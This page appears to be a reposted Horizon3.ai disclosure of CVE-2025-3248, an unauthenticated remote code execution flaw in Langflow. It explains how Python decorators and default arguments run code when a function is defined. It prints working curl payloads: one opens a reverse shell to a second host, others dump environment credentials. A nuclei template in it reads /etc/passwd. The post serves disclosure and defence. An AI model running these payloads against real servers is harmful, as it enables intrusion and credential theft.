<!DOCTYPE html><html lang=zh><head><meta charset=UTF-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=renderer content=webkit><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"><title>18K软件 AI工具 免费资源</title><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/libs/highlight/styles/18k.css><meta name=generator content="Hexo 7.3.0"></head><body id=bodyx><div class="hd posts"><a href=javascript:history.back() class=replay-btn>返回</a><div class=post-title><p>Unsafe at Any Speed Abusing Python Exec for Unauth RCE in Langflow AI</p><hr></div><div class=post-content><h1 id=Unsafe-at-Any-Speed-Abusing-Python-Exec-for-Unauth-RCE-in-Langflow-AI><a href=#Unsafe-at-Any-Speed-Abusing-Python-Exec-for-Unauth-RCE-in-Langflow-AI class=headerlink title="Unsafe at Any Speed: Abusing Python Exec for Unauth RCE in Langflow AI"></a>Unsafe at Any Speed: Abusing Python Exec for Unauth RCE in Langflow AI</h1><p>Naveen Sunkavally  |  April 9, 2025  |  <a target=_blank rel=noopener href=https://horizon3.ai/category/attack-research/attack-blogs/ >Attack Blogs</a>, <a target=_blank rel=noopener href=https://horizon3.ai/category/attack-research/disclosures/ >Disclosures</a></p><h2 id=TL-DR><a href=#TL-DR class=headerlink title=TL;DR></a>TL;DR</h2><p>We discovered an interesting code injection vulnerability, <a target=_blank rel=noopener href="https://www.cve.org/CVERecord?id=CVE-2025-3248">CVE-2025-3248</a>, in <a target=_blank rel=noopener href=https://www.langflow.org/ >Langflow</a>, a popular tool used for building agentic AI workflows. This vulnerability is easily exploitable and enables unauthenticated remote attackers to fully compromise Langflow servers. <strong>The issue is patched in Langflow 1.3.0, and we encourage all users to upgrade to the latest version.</strong></p><p><em>Note</em>: <em>We are choosing to publish full details now since an exploit has already been published for this vulnerability.</em></p><h2 id=Background><a href=#Background class=headerlink title=Background></a>Background</h2><p>“Agentic AI” is everywhere these days, and a vibrant ecosystem of AI tools has sprouted up around it. One of the more popular tools out there is <a target=_blank rel=noopener href=https://github.com/langflow-ai/langflow>Langflow</a>, an open source project with 50K+ GitHub stars that is backed by DataStax and IBM.</p><p>Langflow is a Python based web application that provides a visual interface to build AI-driven agents and workflows.</p><p>![Langflow Visual Interface](<a target=_blank rel=noopener href=http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-03-at-6.30.32>http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-03-at-6.30.32</a> PM-1024x582.png)</p><p>There have been a few critical security vulnerabilities (<a target=_blank rel=noopener href="https://www.cve.org/CVERecord?id=CVE-2024-7297">CVE-2024-7297</a>, <a target=_blank rel=noopener href=https://nvd.nist.gov/vuln/detail/CVE-2024-48061>CVE-2024-48061</a>, <a target=_blank rel=noopener href=https://nvd.nist.gov/vuln/detail/CVE-2024-42835>CVE-2024-42835</a>, <a target=_blank rel=noopener href=https://nvd.nist.gov/vuln/detail/CVE-2024-37014>CVE-2024-37014</a>) reported in the past against Langflow, but these CVEs look questionable. Langflow provides “remote code execution as a feature” to any authenticated user because it allows users to modify and execute the Python code backing its visual components. It also by design does not support a sandbox for code execution. These CVEs seem to assume that Langflow has been configured without authentication or an attacker already has credentials.</p><p>We wanted to see what was possible as an unauthenticated attacker if Langflow is configured with authentication enabled, as most instances exposed to the Internet are.</p><h2 id=A-Bad-Code-Smell><a href=#A-Bad-Code-Smell class=headerlink title="A Bad Code Smell"></a>A Bad Code Smell</h2><p>Within a few minutes of looking at the source code, we identified something fishy – <a target=_blank rel=noopener href=https://github.com/langflow-ai/langflow/blob/1.2.0/src/backend/base/langflow/api/v1/validate.py>an unauthenticated API endpoint</a> &#x2F;<code>api/v1/validate/code</code> running Python <code>exec</code> on untrusted user input.</p><p><a target=_blank rel=noopener href=https://github.com/langflow-ai/langflow/blob/1.2.0/src/backend/base/langflow/utils/validate.py>https://github.com/langflow-ai/langflow/blob/1.2.0/src/backend/base/langflow/utils/validate.py</a></p><p>![](<a target=_blank rel=noopener href=http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-03-at-6.52.30>http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-03-at-6.52.30</a> PM-970x1024.png)</p><p>But how does one actually exploit this? This isn’t a straight <code>exec</code> on user input.</p><p>The code uses the <code>ast</code> module to parse user input and extracts any <code>ast.Import</code> and <code>ast.FunctionDef</code> nodes, i.e. any Python <code>import</code> statements and function definitions.</p><p>Imports are validated using <code>importlib.import_module</code>. This can’t be directly exploited unless an attacker can first upload an arbitrary Python file onto the file system within Python’s module search path. We didn’t find a way to do this.</p><p>Function definitions are validated using <code>compile</code> and <code>exec</code>. A function definition is not the same as a functionthough. Executing a function definition only makes the function available for execution within the current Python namespace; it doesn’t actually execute the function code. We tried polluting the current namespace by overwriting existing global and local function names but weren’t successful. Digging deeper…</p><h2 id=Diving-into-Python-Decorators><a href=#Diving-into-Python-Decorators class=headerlink title="Diving into Python Decorators"></a>Diving into Python Decorators</h2><p>What exactly is an <code>ast.FunctionDef</code>? In Python, function definitions also include the decorators attached to the function.</p><p>![](<a target=_blank rel=noopener href=http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-04-at-10.11.49>http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-04-at-10.11.49</a> AM-1024x368.png)</p><p>If you’ve worked with Python long enough, you’re probably familiar with decorators. Decorators are functions that return functions that wrap other functions. In Python web apps, they’re commonly used to implement authentication&#x2F;authorization controls, such as <code>@login_required</code>. Here’s <a target=_blank rel=noopener href=https://www.geeksforgeeks.org/decorators-in-python/ >a simple example</a>:</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext"># A simple decorator function<br>def decorator(func):<br>    def wrapper():<br>        print(&quot;Before calling the function.&quot;)<br>        func()<br>        print(&quot;After calling the function.&quot;)<br>    return wrapper<br><br># Applying the decorator to a function<br>@decorator<br>def greet():<br>    print(&quot;Hello, World!&quot;)<br><br>greet()<br></code></pre></td></tr></table></figure><p>Calling <code>greet</code> here is equivalent to calling the <code>wrapper</code> function returned by <code>decorator</code> and results in the following output:</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">Before calling the function.<br>Hello, World!<br>After calling the function.<br></code></pre></td></tr></table></figure><p>But decorators don’t have to be functions or return functions. Decorators are actually modeled as <em>expressions</em> – arbitrary Python code statements.</p><p>Let’s say you have a file called <code>foomodule.py</code> with the following code:</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">@__import__(&quot;os&quot;).system(&quot;echo Inside foo decorator&quot;)<br>def foo():<br>    print(&quot;Inside foo function&quot;)<br><br></code></pre></td></tr></table></figure><p>And in the same directory another file <code>main.py</code> with just the following line:</p><p><code>import foomodule</code></p><p>And then you run <code>python main.py</code>:</p><p>![](<a target=_blank rel=noopener href=http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-04-at-5.47.13>http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-04-at-5.47.13</a> PM-1024x254.png)</p><p>The import of <code>foomodule</code> in <code>main.py</code> executes the function definition of <code>foo</code>, which executes the decorator, which in turn runs <code>os.system(&quot;echo Inside foo decorator&quot;)</code>, resulting in the output <code>Inside foo decorator</code>. The <code>foo</code> function itself is never called, as expected.</p><h3 id=Abusing-Decorators-for-Remote-Code-Execution><a href=#Abusing-Decorators-for-Remote-Code-Execution class=headerlink title="Abusing Decorators for Remote Code Execution"></a>Abusing Decorators for Remote Code Execution</h3><p>Remote code execution is easy now – just stick the payload into a decorator. Here’s an example of landing a Python reverse shell, targeting a vulnerable host at 10.0.220.200.</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">curl -X POST -H &#x27;Content-Type: application/json&#x27; http://10.0.220.200:8000/api/v1/validate/code -d &#x27;&#123;&quot;code&quot;: &quot;@exec(\&quot;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\&quot;10.0.220.201\\\&quot;,9999));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\&quot;/bin/sh\\\&quot;)\&quot;)\ndef foo():\n  pass&quot;&#125;&#x27;<br><br></code></pre></td></tr></table></figure><p>![](<a target=_blank rel=noopener href=http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-05-at-12.00.21>http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-05-at-12.00.21</a> AM-1024x457.png)</p><h4 id=Interactive-RCE><a href=#Interactive-RCE class=headerlink title="Interactive RCE"></a>Interactive RCE</h4><p>Interactive RCE is possible by raising an Exception from the decorator. For instance the following will execute the <code>env</code> command and return the username and password of the Langflow superuser, assuming Langflow has been set up with authentication enabled:</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">curl -X POST -H &#x27;Content-Type: application/json&#x27; http://10.0.220.200:8000/api/v1/validate/code -d &#x27;&#123;&quot;code&quot;: &quot;@exec(\&quot;raise Exception(__import__(\\\&quot;subprocess\\\&quot;).check_output(\\\&quot;env\\\&quot;))\&quot;)\ndef foo():\n  pass&quot;&#125;&#x27;<br></code></pre></td></tr></table></figure><p>![](<a target=_blank rel=noopener href=http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-09-at-11.46.49>http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-09-at-11.46.49</a> AM-1024x274.png)</p><h2 id=Another-Path-to-RCE-Python-Default-Arguments><a href=#Another-Path-to-RCE-Python-Default-Arguments class=headerlink title="Another Path to RCE: Python Default Arguments"></a>Another Path to RCE: Python Default Arguments</h2><p>After the CVE was published, <a target=_blank rel=noopener href=https://x.com/_r00tuser/status/1909858365234463122>another researcher published a POC</a> that abused another feature of Python functions: default arguments. These are also modeled as expressions in Python and get executed when a function is defined.</p><p>![](<a target=_blank rel=noopener href=http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-09-at-11.54.45>http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-09-at-11.54.45</a> AM-1024x726.png)</p><p>So just as well, you can stick your payload into the default argument for a function:</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">curl -H &#x27;Content-Type: application/json&#x27; http://10.0.220.200:8000/api/v1/validate/code -d &#x27;&#123;&quot;code&quot;:&quot;def foo(cmd=exec(\&quot;raise Exception(__import__(\\\&quot;subprocess\\\&quot;).check_output(\\\&quot;env\\\&quot;))\&quot;)):\n  pass&quot;&#125;&#x27;<br></code></pre></td></tr></table></figure><p>![](<a target=_blank rel=noopener href=http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-09-at-12.06.39>http://www.18k.icu/images/20250615_03_zb9hsr6q/Screenshot-2025-04-09-at-12.06.39</a> PM-1024x216.png)</p><h2 id=Detection><a href=#Detection class=headerlink title=Detection></a>Detection</h2><p>Here’s a nuclei template that uses the interactive RCE to grab the <code>/etc/passwd</code> file on a vulnerable Langflow server:</p><figure class="highlight plaintext"><table><tr><td class=code><pre><code class="hljs plaintext">id: CVE-2025-3248<br>info:<br>  name: Langflow RCE<br>  author: nvn1729<br>  severity: critical<br>  description: This template exploits an unauth RCE in Langflow<br>  tags: python,injection,vulnerability,cve<br><br>requests:<br>  - raw:<br>      - |<br>        POST /api/v1/validate/code HTTP/1.1<br>        Host: &#123;&#123;Hostname&#125;&#125;<br>        Content-Type: application/json<br>      <br>        &#123;&quot;code&quot;: &quot;@exec(&#x27;raise Exception(__import__(\&quot;subprocess\&quot;).check_output([\&quot;cat\&quot;, \&quot;/etc/passwd\&quot;]))&#x27;)\ndef foo():\n  pass&quot;&#125;<br><br>    matchers-condition: and<br>    matchers:<br>      - type: regex<br>        part: body<br>        regex:<br>          - &quot;root:.*:0:0:&quot;<br><br>      - type: status<br>        status:<br>          - 200<br></code></pre></td></tr></table></figure><h2 id=Remediation><a href=#Remediation class=headerlink title=Remediation></a>Remediation</h2><p>We urge all users of Langflow to upgrade to at least version 1.3.0 or restrict network access to it. As of this writing, there are 500+ exposed instances of Langflow on the Internet, <a target=_blank rel=noopener href="https://search.censys.io/search?resource=hosts&sort=RELEVANCE&per_page=25&virtual_hosts=EXCLUDE&q=services.http.response.body:langflow">according to Censys</a>.</p><p>The vulnerable code is present in the earliest versions of Langflow dating back two years, and from our testing it appears most, if not all, versions prior to 1.3.0 are exploitable. The patch puts the vulnerable endpoint behind authentication. Technically this vulnerability can still be exploited to escalate privileges from a regular user to a Langflow superuser, but that is already possible without this vulnerability too. We’re not really clear why Langflow distinguishes between superusers and regular users when all regular users can execute code on the server by design.</p><p>As a general practice we recommend caution when exposing any recently developed AI tools to the Internet. If you must expose it externally, consider putting it an isolated VPC and&#x2F;or behind SSO. It only takes one errant&#x2F;shadow IT deployment of these tools on some cloud instance to have a breach on your hands.</p><h2 id=Timeline><a href=#Timeline class=headerlink title=Timeline></a>Timeline</h2><ul><li><strong>Feb. 22, 2025</strong>: Horizon3.ai reports issue to Langflow using GitHub security issue</li><li><strong>Feb. 24, 2025</strong>: Horizon3.ai raises regular GitHub issue asking maintainers to look at GitHub security issue</li><li><strong>Feb. 25, 2025:</strong> Horizon3.ai raises issue to DataStax through HackerOne as a fallback</li><li><strong>Feb. 26, 2025</strong>: Horizon3.ai raises issue to DataStax over email. DataStax acknowledges and says there will be an update on the GitHub security issue.</li><li><strong>Feb. 28, 2025</strong>: Support for exploit added to Horizon3’s NodeZero product</li><li><strong>Mar. 3, 2025</strong>: With no update on the GitHub security issue, Horizon3.ai follows up again with DataStax.</li><li><strong>Mar. 4, 2025</strong>: <a target=_blank rel=noopener href=https://github.com/langflow-ai/langflow/pull/6911>Pull request</a> created to fix the issue.</li><li><strong>Mar. 5, 2025</strong>: PR merged</li><li><strong>Mar. 10, 2025</strong>: Horizon3.ai requests CVE from MITRE</li><li><strong>Mar. 17, 2025:</strong> HackerOne triages issues (already fixed at this point)</li><li><strong>Mar. 31, 2025</strong>: <a target=_blank rel=noopener href=https://github.com/langflow-ai/langflow/releases/tag/1.3.0>Langflow 1.3.0</a> released</li><li><strong>Apr 1, 2025</strong>: Horizon3.ai follows up with MITRE for CVE</li><li><strong>Apr. 2, 2025</strong>: Horizon3.ai requests CVE from VulnCheck</li><li><strong>Apr. 3, 2025</strong>: VulnCheck assigns <a target=_blank rel=noopener href="https://www.cve.org/CVERecord?id=CVE-2025-3248">CVE-2025-3248</a></li><li><strong>Apr. 7, 2025</strong>: CVE-2025-3248 published, Horizon3.ai asks MITRE to cancel original CVE request</li><li><strong>Apr. 9, 2025</strong>: Third-party publishes exploit</li><li><strong>Apr. 9, 2025</strong>: This post</li></ul><p>Shout out to VulnCheck for their timely response in getting a CVE assigned.</p><p>As usual, as with any zero-day, Horizon3’s NodeZero product had coverage for this vulnerability shortly after it was reported to the vendor.</p><p>To see how the NodeZero platform can help uncover and remediate critical vulnerabilities like this in your environment, visit our <a target=_blank rel=noopener href=https://horizon3.ai/nodezero/ >NodeZero Platform</a> page or speak with an expert by <a target=_blank rel=noopener href=https://horizon3.ai/contact-us/schedule-demo/ >requesting a demo</a>.</p><h2 id=References><a href=#References class=headerlink title=References></a>References</h2><ul><li><a target=_blank rel=noopener href=https://github.com/langflow-ai/langflow/releases/tag/1.3.0>https://github.com/langflow-ai/langflow/releases/tag/1.3.0</a></li><li><a target=_blank rel=noopener href=https://github.com/langflow-ai/langflow/pull/6911>https://github.com/langflow-ai/langflow/pull/6911</a></li><li><a target=_blank rel=noopener href="https://www.cve.org/cverecord?id=CVE-2025-3248">https://www.cve.org/cverecord?id=CVE-2025-3248</a></li></ul></div></div><div class=footer id=footer><p>Copyright © 2025 <a class=flink target=_blank rel=noopener href=http://www.18k.icu>www.18k.icu</a> <label class="el-switch el-switch-green el-switch-sm" style=vertical-align:sub><input type=checkbox name=switch id=update_style> <span class=el-switch-style></span></label></p></div><input type=hidden id=web_style value=black> <input type=hidden id=valine_appid value=CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz> <input type=hidden id=valine_appKey value=FqiyUqbg7McKN2eG0MCewupf><script src=https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.min.js></script><script src=/libs/highlight/highlight.pack.js></script><script src=/js/js.js></script><style>.v *{color:#698fca}.v .vlist .vcard .vhead .vsys{color:#3a3e4a}.v .vlist .vcard .vh .vmeta .vat{color:#638fd5}.v .vlist .vcard .vhead .vnick{color:#6ba1ff}.v a{color:#8696b1}.v .vlist .vcard .vhead .vnick:hover{color:#669bfc}</style><script>var _hmt=_hmt||[];(()=>{var e=document.createElement("script"),t=(e.src="https://hm.baidu.com/hm.js?eb7eb8199824646269cd262b46a87950",document.getElementsByTagName("script")[0]);t.parentNode.insertBefore(e,t)})()</script></body></html>